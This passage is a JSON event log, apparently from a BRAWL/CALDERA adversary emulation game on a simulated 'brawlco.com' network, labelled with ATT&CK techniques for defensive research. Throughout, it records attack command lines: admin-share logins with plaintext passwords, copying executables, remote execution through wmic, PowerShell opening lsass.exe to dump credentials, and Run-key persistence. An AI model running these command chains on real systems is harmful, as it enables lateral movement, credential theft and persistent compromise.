"2017-05-01T19:08:54.299000+00:00", "nodetype": "event", "object": "registry", "host": "zissler-pc.brawlco.com", "fqdn": "zissler-pc.brawlco.com"}, {"nodetype": "step", "events": ["f0fcb10a-db9b-4979-8022-d11dce451a2c", "3c4f7023-35e1-4371-aad8-57f946112a1a"], "id": "f11b831b-c0da-490e-ba58-79458f4d1f22", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "8570d037-76fc-487f-a9be-893827ec3905", "pid": 316, "happened_before": "2017-05-01T19:09:17.608000+00:00", "happened_after": "2017-05-01T19:09:17.401000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "net use \\\\peele-pc.brawlco.com\\C$ 5miEQ6*Sj] /user:brawlco\\npeele"}, {"nodetype": "step", "events": ["8570d037-76fc-487f-a9be-893827ec3905"], "id": "e6d4f5de-fc4e-44fc-90e4-f5779927914b", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "44597672-40f7-450d-83a8-352d64fc591b", "pid": 3532, "happened_before": "2017-05-01T19:09:40.186000+00:00", "happened_after": "2017-05-01T19:09:39.971000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\raised.exe\" \"\\\\peele-pc.brawlco.com\\C$\\born.exe\""}, {"action": "create", "fqdn": "peele-pc.brawlco.com", "file_path": "C:\\born.exe", "happened_before": "2017-05-01T19:09:40.755000+00:00", "happened_after": "2017-05-01T19:09:39.823000+00:00", "nodetype": "event", "object": "file", "host": "peele-pc.brawlco.com", "id": "bf01bb38-7f58-45f6-a49a-b779c456d7e9"}, {"nodetype": "step", "events": ["44597672-40f7-450d-83a8-352d64fc591b", "bf01bb38-7f58-45f6-a49a-b779c456d7e9"], "id": "5761b4d6-50bc-44b9-92d5-d1d46c057060", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "zissler-pc.brawlco.com", "id": "dfe0345c-a543-42c5-bca0-1cea191c2256", "pid": 1260, "happened_before": "2017-05-01T19:09:43.377000+00:00", "happened_after": "2017-05-01T19:09:42.341000+00:00", "nodetype": "event", "object": "process", "ppid": 3388, "host": "zissler-pc.brawlco.com", "command_line": "wmic /node:\"peele-pc.brawlco.com\" /user:\"brawlco\\npeele\" /password:\"5miEQ6*Sj]\" process call create \"C:\\born.exe -d -f\""}, {"nodetype": "step", "events": ["dfe0345c-a543-42c5-bca0-1cea191c2256"], "id": "e39b5a9e-554f-43cc-9677-5616a84241bc", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "peele-pc.brawlco.com", "id": "e2cde13f-34b9-4df6-ad5c-7e57f32c07f8", "pid": 3432, "happened_before": "2017-05-01T19:10:15.233000+00:00", "happened_after": "2017-05-01T19:10:05.811000+00:00", "nodetype": "event", "object": "process", "ppid": 3820, "host": "peele-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "peele-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:10:15.233000+00:00", "actor_pid": 3432, "happened_after": "2017-05-01T19:10:05.811000+00:00", "nodetype": "event", "object": "process", "host": "peele-pc.brawlco.com", "id": "8ca582de-a896-41d4-b876-8485508b25c0"}, {"nodetype": "step", "events": ["e2cde13f-34b9-4df6-ad5c-7e57f32c07f8", "8ca582de-a896-41d4-b876-8485508b25c0"], "id": "fa4ea9e0-3dea-49f5-9774-7d3e59729aec", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "peele-pc.brawlco.com", "id": "4acdb5ea-d860-4d68-abf8-ad10a6ce9579", "pid": 1668, "happened_before": "2017-05-01T19:10:39.512000+00:00", "happened_after": "2017-05-01T19:10:39.287000+00:00", "nodetype": "event", "object": "process", "ppid": 3820, "host": "peele-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\born.exe /f"}, {"action": "add", "data": "C:\\born.exe", "id": "31d611f2-93f2-42b8-a5ac-0a35ecc7927f", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:10:40.362000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:10:39.100000+00:00", "nodetype": "event", "object": "registry", "host": "peele-pc.brawlco.com", "fqdn": "peele-pc.brawlco.com"}, {"nodetype": "step", "events": ["4acdb5ea-d860-4d68-abf8-ad10a6ce9579", "31d611f2-93f2-42b8-a5ac-0a35ecc7927f"], "id": "22591eaa-e275-443b-8d25-7ffb7a1503ed", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "platten-pc.brawlco.com", "id": "be041eff-855f-4555-8fe7-2ea3edcde30a", "pid": 3452, "happened_before": "2017-05-01T19:11:02.670000+00:00", "happened_after": "2017-05-01T19:11:02.220000+00:00", "nodetype": "event", "object": "process", "ppid": 3912, "host": "platten-pc.brawlco.com", "command_line": "net use \\\\kressierer-pc.brawlco.com\\C$ 22.%drRAvp /user:brawlco\\tkressierer"}, {"nodetype": "step", "events": ["be041eff-855f-4555-8fe7-2ea3edcde30a"], "id": "1c5845f9-8edb-47d0-89c8-4aefdaa24fd8", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "platten-pc.brawlco.com", "id": "bce4788e-5842-4f94-9784-6def032f4acf", "pid": 1156, "happened_before": "2017-05-01T19:11:25.646000+00:00", "happened_after": "2017-05-01T19:11:25.243000+00:00", "nodetype": "event", "object": "process", "ppid": 3912, "host": "platten-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\and.exe\" \"\\\\kressierer-pc.brawlco.com\\C$\\philadelphia.exe\""}, {"action": "create", "fqdn": "kressierer-pc.brawlco.com", "file_path": "C:\\philadelphia.exe", "happened_before": "2017-05-01T19:11:26.224000+00:00", "happened_after": "2017-05-01T19:11:25.088000+00:00", "nodetype": "event", "object": "file", "host": "kressierer-pc.brawlco.com", "id": "8da94661-be7b-48d7-bb97-bab2d33fc15c"}, {"nodetype": "step", "events": ["bce4788e-5842-4f94-9784-6def032f4acf", "8da94661-be7b-48d7-bb97-bab2d33fc15c"], "id": "7a8203f4-8536-42bc-a67d-f5ecf3a42e9a", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "54c8871c-4cdb-4d05-973e-dbb0d45dffe2", "pid": 140, "happened_before": "2017-05-01T19:11:28.408000+00:00", "happened_after": "2017-05-01T19:11:28.063000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "wmic /node:\"kressierer-pc.brawlco.com\" /user:\"brawlco\\tkressierer\" /password:\"22.%drRAvp\" process call create \"C:\\philadelphia.exe -d -f\""}, {"nodetype": "step", "events": ["54c8871c-4cdb-4d05-973e-dbb0d45dffe2"], "id": "9bebb67e-e27e-4f11-901a-bbe8602a834c", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "kressierer-pc.brawlco.com", "id": "8d86d0e9-116a-4690-b089-0bcf30c2b5e0", "pid": 2372, "happened_before": "2017-05-01T19:12:02.714000+00:00", "happened_after": "2017-05-01T19:11:51.063000+00:00", "nodetype": "event", "object": "process", "ppid": 3520, "host": "kressierer-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "kressierer-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:12:02.714000+00:00", "actor_pid": 2372, "happened_after": "2017-05-01T19:11:51.063000+00:00", "nodetype": "event", "object": "process", "host": "kressierer-pc.brawlco.com", "id": "37b7f547-9640-4361-821f-96baa414c9cb"}, {"nodetype": "step", "events": ["8d86d0e9-116a-4690-b089-0bcf30c2b5e0", "37b7f547-9640-4361-821f-96baa414c9cb"], "id": "4191cf78-7e2b-4db6-983f-7e43f03922b2", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "kressierer-pc.brawlco.com", "id": "41605d62-3cb6-42b2-8f13-b793f9c3f427", "pid": 1756, "happened_before": "2017-05-01T19:12:26.650000+00:00", "happened_after": "2017-05-01T19:12:26.430000+00:00", "nodetype": "event", "object": "process", "ppid": 3520, "host": "kressierer-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\philadelphia.exe /f"}, {"action": "add", "data": "C:\\philadelphia.exe", "id": "74793781-1d36-40ce-bd34-784d3aaf7642", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:12:27.494000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:12:26.263000+00:00", "nodetype": "event", "object": "registry", "host": "kressierer-pc.brawlco.com", "fqdn": "kressierer-pc.brawlco.com"}, {"nodetype": "step", "events": ["41605d62-3cb6-42b2-8f13-b793f9c3f427", "74793781-1d36-40ce-bd34-784d3aaf7642"], "id": "ddc334a4-2833-49ea-951a-88003cce534d", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "colgan-pc.brawlco.com", "id": "6a542bf0-d0ba-4443-9f59-367264b2561d", "pid": 2060, "happened_before": "2017-05-01T19:12:50.300000+00:00", "happened_after": "2017-05-01T19:12:49.890000+00:00", "nodetype": "event", "object": "process", "ppid": 856, "host": "colgan-pc.brawlco.com", "command_line": "net use \\\\minahan-pc.brawlco.com\\C$ qSR]r8XmKX /user:brawlco\\gminahan"}, {"nodetype": "step", "events": ["6a542bf0-d0ba-4443-9f59-367264b2561d"], "id": "aa1ad3c1-2606-4e9b-ba11-dfc2bcd6c668", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "colgan-pc.brawlco.com", "id": "a769c18f-d445-453c-b8c9-d963c4245299", "pid": 1360, "happened_before": "2017-05-01T19:13:13.073000+00:00", "happened_after": "2017-05-01T19:13:12.815000+00:00", "nodetype": "event", "object": "process", "ppid": 856, "host": "colgan-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\and.exe\" \"\\\\minahan-pc.brawlco.com\\C$\\west.exe\""}, {"action": "create", "fqdn": "minahan-pc.brawlco.com", "file_path": "C:\\west.exe", "happened_before": "2017-05-01T19:13:13.676000+00:00", "happened_after": "2017-05-01T19:13:12.642000+00:00", "nodetype": "event", "object": "file", "host": "minahan-pc.brawlco.com", "id": "601cdda3-4467-4973-a149-bb9897072c29"}, {"nodetype": "step", "events": ["a769c18f-d445-453c-b8c9-d963c4245299", "601cdda3-4467-4973-a149-bb9897072c29"], "id": "fca1ae87-566c-44e7-ad4f-2539c63cb26e", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "zissler-pc.brawlco.com", "id": "c0ad744c-87f4-4364-9270-4edf4b211b70", "pid": 1272, "happened_before": "2017-05-01T19:13:16.129000+00:00", "happened_after": "2017-05-01T19:13:15.673000+00:00", "nodetype": "event", "object": "process", "ppid": 3388, "host": "zissler-pc.brawlco.com", "command_line": "wmic /node:\"minahan-pc.brawlco.com\" /user:\"brawlco\\gminahan\" /password:\"qSR]r8XmKX\" process call create \"C:\\west.exe -d -f\""}, {"nodetype": "step", "events": ["c0ad744c-87f4-4364-9270-4edf4b211b70"], "id": "742fdcce-6a6d-4e51-a976-c6789b17e760", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "minahan-pc.brawlco.com", "id": "f80497e0-c465-46cb-99c3-e7dbadc1ebdc", "pid": 1436, "happened_before": "2017-05-01T19:13:47.837000+00:00", "happened_after": "2017-05-01T19:13:38.922000+00:00", "nodetype": "event", "object": "process", "ppid": 3564, "host": "minahan-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "minahan-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:13:47.837000+00:00", "actor_pid": 1436, "happened_after": "2017-05-01T19:13:38.922000+00:00", "nodetype": "event", "object": "process", "host": "minahan-pc.brawlco.com", "id": "d5ca083a-661c-429b-bd41-351674941e1d"}, {"nodetype": "step", "events": ["f80497e0-c465-46cb-99c3-e7dbadc1ebdc", "d5ca083a-661c-429b-bd41-351674941e1d"], "id": "b887ca57-bb1a-4ee4-93ef-a4e16deb8976", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "minahan-pc.brawlco.com", "id": "fef35bdc-6cf7-412d-bd07-c169ce0fed84", "pid": 2332, "happened_before": "2017-05-01T19:14:12.204000+00:00", "happened_after": "2017-05-01T19:14:11.899000+00:00", "nodetype": "event", "object": "process", "ppid": 3564, "host": "minahan-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\west.exe /f"}, {"action": "add", "data": "C:\\west.exe", "id": "72db5e20-b57b-4a60-8dc6-a9ef4d83cc79", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:14:13.121000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:14:11.725000+00:00", "nodetype": "event", "object": "registry", "host": "minahan-pc.brawlco.com", "fqdn": "minahan-pc.brawlco.com"}, {"nodetype": "step", "events": ["fef35bdc-6cf7-412d-bd07-c169ce0fed84", "72db5e20-b57b-4a60-8dc6-a9ef4d83cc79"], "id": "438f4dcf-1ac5-4e2d-96dd-17a8408daf27", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "33f9a536-de03-423d-bdcb-128156fd1774", "pid": 3248, "happened_before": "2017-05-01T19:14:35.327000+00:00", "happened_after": "2017-05-01T19:14:35.081000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "net use \\\\sespinosa-pc.brawlco.com\\C$ x%6vn]60E# /user:brawlco\\wsespinosa"}, {"nodetype": "step", "events": ["33f9a536-de03-423d-bdcb-128156fd1774"], "id": "d31c0194-f2b3-4dd5-a01e-c1a2b73cf086", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "b8494516-b2c6-4f3c-b6c8-8347bbc362ea", "pid": 272, "happened_before": "2017-05-01T19:14:58.647000+00:00", "happened_after": "2017-05-01T19:14:58.353000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\sespinosa-pc.brawlco.com\\C$\\philadelphia.exe\""}, {"action": "create", "fqdn": "sespinosa-pc.brawlco.com", "file_path": "C:\\philadelphia.exe", "happened_before": "2017-05-01T19:14:59.331000+00:00", "happened_after": "2017-05-01T19:14:58.112000+00:00", "nodetype": "event", "object": "file", "host": "sespinosa-pc.brawlco.com", "id": "ec3ac7e0-39e4-4cb8-91d8-af20828088d0"}, {"nodetype": "step", "events": ["b8494516-b2c6-4f3c-b6c8-8347bbc362ea", "ec3ac7e0-39e4-4cb8-91d8-af20828088d0"], "id": "910f6620-5e62-4050-baf1-e4fa4d7b2e0b", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "48fb82d0-4ed7-4808-9cb9-49dc0d93c2f4", "pid": 4024, "happened_before": "2017-05-01T19:15:02.300000+00:00", "happened_after": "2017-05-01T19:15:01.738000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "wmic /node:\"sespinosa-pc.brawlco.com\" /user:\"brawlco\\wsespinosa\" /password:\"x%6vn]60E#\" process call create \"C:\\philadelphia.exe -d -f\""}, {"nodetype": "step", "events": ["48fb82d0-4ed7-4808-9cb9-49dc0d93c2f4"], "id": "b7ba11cb-d6ef-40ec-bfb0-58425aedfc39", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sespinosa-pc.brawlco.com", "id": "b244b233-13b0-4e27-b185-4120c9b1c42e", "pid": 1580, "happened_before": "2017-05-01T19:15:35.609000+00:00", "happened_after": "2017-05-01T19:15:25.407000+00:00", "nodetype": "event", "object": "process", "ppid": 984, "host": "sespinosa-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "sespinosa-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:15:35.609000+00:00", "actor_pid": 1580, "happened_after": "2017-05-01T19:15:25.407000+00:00", "nodetype": "event", "object": "process", "host": "sespinosa-pc.brawlco.com", "id": "a00fca5c-b5f0-49a4-8ffd-fc4aa7dd726e"}, {"nodetype": "step", "events": ["b244b233-13b0-4e27-b185-4120c9b1c42e", "a00fca5c-b5f0-49a4-8ffd-fc4aa7dd726e"], "id": "183482c8-53d1-4845-89cd-03b6bfe0a0d2", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "sespinosa-pc.brawlco.com", "id": "7992bcef-967d-4360-9759-33be21df27fa", "pid": 2668, "happened_before": "2017-05-01T19:16:00.423000+00:00", "happened_after": "2017-05-01T19:16:00.103000+00:00", "nodetype": "event", "object": "process", "ppid": 984, "host": "sespinosa-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\philadelphia.exe /f"}, {"action": "add", "data": "C:\\philadelphia.exe", "id": "452414db-09a1-4d82-acc7-c91eca1176b7", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:16:01.424000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:15:59.902000+00:00", "nodetype": "event", "object": "registry", "host": "sespinosa-pc.brawlco.com", "fqdn": "sespinosa-pc.brawlco.com"}, {"nodetype": "step", "events": ["7992bcef-967d-4360-9759-33be21df27fa", "452414db-09a1-4d82-acc7-c91eca1176b7"], "id": "6950c930-f456-4408-8ef2-6f1175a4c22c", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "kressierer-pc.brawlco.com", "id": "b6d68e38-2bbf-461d-827d-bb7c03dcd1d2", "pid": 304, "happened_before": "2017-05-01T19:16:24.041000+00:00", "happened_after": "2017-05-01T19:16:23.739000+00:00", "nodetype": "event", "object": "process", "ppid": 3520, "host": "kressierer-pc.brawlco.com", "command_line": "net use \\\\harley-pc.brawlco.com\\C$ FuVuL*F6fU /user:brawlco\\dharley"}, {"nodetype": "step", "events": ["b6d68e38-2bbf-461d-827d-bb7c03dcd1d2"], "id": "19169a40-8dce-4cc4-b492-2f280dc9544c", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "kressierer-pc.brawlco.com", "id": "14084939-9678-492c-a833-4112d8f11e24", "pid": 2816, "happened_before": "2017-05-01T19:16:47.521000+00:00", "happened_after": "2017-05-01T19:16:47.136000+00:00", "nodetype": "event", "object": "process", "ppid": 3520, "host": "kressierer-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\philadelphia.exe\" \"\\\\harley-pc.brawlco.com\\C$\\west.exe\""}, {"action": "create", "fqdn": "harley-pc.brawlco.com", "file_path": "C:\\west.exe", "happened_before": "2017-05-01T19:16:48.176000+00:00", "happened_after": "2017-05-01T19:16:46.926000+00:00", "nodetype": "event", "object": "file", "host": "harley-pc.brawlco.com", "id": "3037ee54-1478-4791-9eaf-11a6d8af4767"}, {"nodetype": "step", "events": ["14084939-9678-492c-a833-4112d8f11e24", "3037ee54-1478-4791-9eaf-11a6d8af4767"], "id": "2b68b8e3-f3e0-413b-a855-a6ab2544668a", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "teston-pc.brawlco.com", "id": "436fddad-3802-4960-ba7c-369e0dedaa35", "pid": 896, "happened_before": "2017-05-01T19:16:52.101000+00:00", "happened_after": "2017-05-01T19:16:50.966000+00:00", "nodetype": "event", "object": "process", "ppid": 928, "host": "teston-pc.brawlco.com", "command_line": "wmic /node:\"harley-pc.brawlco.com\" /user:\"brawlco\\dharley\" /password:\"FuVuL*F6fU\" process call create \"C:\\west.exe -d -f\""}, {"nodetype": "step", "events": ["436fddad-3802-4960-ba7c-369e0dedaa35"], "id": "f312525b-9bf0-4b3d-8428-0394b71dbdae", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "harley-pc.brawlco.com", "id": "c6e67ad8-1b26-4337-8c74-d4452aeb7680", "pid": 2100, "happened_before": "2017-05-01T19:17:39.036000+00:00", "happened_after": "2017-05-01T19:17:18.789000+00:00", "nodetype": "event", "object": "process", "ppid": 3508, "host": "harley-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "harley-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:17:39.036000+00:00", "actor_pid": 2100, "happened_after": "2017-05-01T19:17:18.789000+00:00", "nodetype": "event", "object": "process", "host": "harley-pc.brawlco.com", "id": "1810a78b-03d2-4f43-91bf-179c20deca26"}, {"nodetype": "step", "events": ["c6e67ad8-1b26-4337-8c74-d4452aeb7680", "1810a78b-03d2-4f43-91bf-179c20deca26"], "id": "e8c8a773-8e22-4136-a9a9-44bba3c30fc0", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "harley-pc.brawlco.com", "id": "66b5ac16-e6fd-4ae4-a1eb-1ab92701e756", "pid": 3008, "happened_before": "2017-05-01T19:18:04.180000+00:00", "happened_after": "2017-05-01T19:18:03.897000+00:00", "nodetype": "event", "object": "process", "ppid": 3508, "host": "harley-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\west.exe /f"}, {"action": "add", "data": "C:\\west.exe", "id": "141b8107-0215-4b3c-915c-84e950a35b5e", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:18:05.316000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:18:03.681000+00:00", "nodetype": "event", "object": "registry", "host": "harley-pc.brawlco.com", "fqdn": "harley-pc.brawlco.com"}, {"nodetype": "step", "events": ["66b5ac16-e6fd-4ae4-a1eb-1ab92701e756", "141b8107-0215-4b3c-915c-84e950a35b5e"], "id": "ef31b036-5c86-4515-9e97-7d1b45255ba8", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "3c7b9cd9-f921-4de6-b1d9-4e9584912e54", "pid": 2956, "happened_before": "2017-05-01T19:18:28.809000+00:00", "happened_after": "2017-05-01T19:18:28.519000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "net use \\\\beane-pc.brawlco.com\\C$ UUOsV1yY]b /user:brawlco\\abeane"}, {"nodetype": "step", "events": ["3c7b9cd9-f921-4de6-b1d9-4e9584912e54"], "id": "4cf1bf45-04bc-4cae-a80e-9d179224ce62", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "b47ba726-2694-48ca-b7e6-eb5229fb3ce0", "pid": 3404, "happened_before": "2017-05-01T19:18:52.120000+00:00", "happened_after": "2017-05-01T19:18:51.861000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\beane-pc.brawlco.com\\C$\\and.exe\""}, {"action": "create", "fqdn": "beane-pc.brawlco.com", "file_path": "C:\\and.exe", "happened_before": "2017-05-01T19:18:52.788000+00:00", "happened_after": "2017-05-01T19:18:51.620000+00:00", "nodetype": "event", "object": "file", "host": "beane-pc.brawlco.com", "id": "7a789758-e238-4a8d-a2f0-d43f80fdbd2d"}, {"nodetype": "step", "events": ["b47ba726-2694-48ca-b7e6-eb5229fb3ce0", "7a789758-e238-4a8d-a2f0-d43f80fdbd2d"], "id": "55e88091-75f8-4684-abd0-1b3df2861f62", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "kressierer-pc.brawlco.com", "id": "1f0ae2bc-ee9a-45f5-8c17-34adaa63442a", "pid": 1284, "happened_before": "2017-05-01T19:18:56.572000+00:00", "happened_after": "2017-05-01T19:18:55.724000+00:00", "nodetype": "event", "object": "process", "ppid": 3520, "host": "kressierer-pc.brawlco.com", "command_line": "wmic /node:\"beane-pc.brawlco.com\" /user:\"brawlco\\abeane\" /password:\"UUOsV1yY]b\" process call create \"C:\\and.exe -d -f\""}, {"nodetype": "step", "events": ["1f0ae2bc-ee9a-45f5-8c17-34adaa63442a"], "id": "f9a6993e-5356-49e9-a29b-2b6628413ff6", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "beane-pc.brawlco.com", "id": "158c7522-5cec-4ce2-b50d-dc1b369f8ef2", "pid": 756, "happened_before": "2017-05-01T19:19:29.811000+00:00", "happened_after": "2017-05-01T19:19:20.129000+00:00", "nodetype": "event", "object": "process", "ppid": 3248, "host": "beane-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "beane-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:19:29.811000+00:00", "actor_pid": 756, "happened_after": "2017-05-01T19:19:20.129000+00:00", "nodetype": "event", "object": "process", "host": "beane-pc.brawlco.com", "id": "20d8eda0-1af6-4c1a-ad7f-f675f06b0730"}, {"nodetype": "step", "events": ["158c7522-5cec-4ce2-b50d-dc1b369f8ef2", "20d8eda0-1af6-4c1a-ad7f-f675f06b0730"], "id": "d605b43d-f742-4ddd-aa6a-7250922674a1", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "beane-pc.brawlco.com", "id": "2830715a-5191-46cc-a956-b2570ab43e81", "pid": 1284, "happened_before": "2017-05-01T19:19:54.844000+00:00", "happened_after": "2017-05-01T19:19:54.566000+00:00", "nodetype": "event", "object": "process", "ppid": 3248, "host": "beane-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\and.exe /f"}, {"action": "add", "data": "C:\\and.exe", "id": "bb5f2314-94a3-412b-802e-ec7817ea0f97", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:19:56.015000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:19:54.373000+00:00", "nodetype": "event", "object": "registry", "host": "beane-pc.brawlco.com", "fqdn": "beane-pc.brawlco.com"}], "game_id": "BRAWL_public_game_001", "@timestamp": "2017-05-01T20:22:12.246Z", "type": "bsf_events", "@uuid": "cb282674-c0cb-4451-abb8-a3ee98f3617b"}
